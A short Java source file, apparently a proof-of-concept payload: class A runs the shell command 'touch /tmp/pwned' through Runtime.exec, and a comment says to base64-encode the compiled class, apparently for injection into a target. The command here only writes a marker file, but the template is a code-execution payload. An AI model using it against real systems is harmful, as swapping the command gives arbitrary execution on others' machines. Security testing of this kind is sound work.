import java.lang.Runtime;
import java.io.IOException;
class A{
    void run(){
        try {
            String[] cmd = {"sh","-c","touch /tmp/pwned"};
            Process process = Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    // After this run base64 A.class > class.b64
}